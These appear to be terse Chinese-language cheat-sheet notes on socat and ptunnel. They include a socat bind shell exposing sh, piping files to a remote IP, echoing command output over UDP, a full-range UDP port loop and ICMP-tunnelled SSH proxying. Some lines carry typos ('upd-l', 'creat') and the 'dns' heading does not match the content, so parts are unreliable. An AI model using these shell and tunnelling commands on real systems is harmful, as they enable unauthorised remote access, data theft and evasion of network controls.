
# dns

* socat

* ptunnle

* proxytunnle



## socat
```shell 
    socat - tcp:1.1.1.1:80
    socat - tcp-listen:22 / socat - tcp-l:333
    3. 发文件
        socat tcp4-listen:333 open:2.txt.creat,append
    4. 收文件
        cat 1.txt| socat - tcp:1.1.1.1:333
    5. 远程shell
        socat tcp-l:23 exec:sh,pty,stderr
    6. 端口转发
        socat tcp-listen:22,fork tcp4:1.1.1.1:22
    7. 远程执行命令
        服务器: socat - upd-l:2001
        客户端: echo "`id`" | socat - udp4-datagram:1.1.1.1:2001
    8. udp全端口任意内容发布
        for PORT in {1..65535}; do echo "aaaaa" | socat - UDP4-DATAGRAM:1.1.1.1:$PORT;sleep .1; done
    9. 二进制编辑器
        echo -e "\0\14\0\0\c" | socat -u - file:/usr/bin/squid.exe,seek,seek=0x00074420
```


## ptunnle
```shell 
    ping tunnel icmp隧道工具

    1. 服务器
        ptunnel -x 1234
    2. 客户端
        sudo ptunnel -p proxy -lp 2222 -da destination -dp 22 -x 1234
    3. 镶嵌ssh隧道
        ssh -CNfg -D 7000 root@127.0.0.1 -p 2222
```




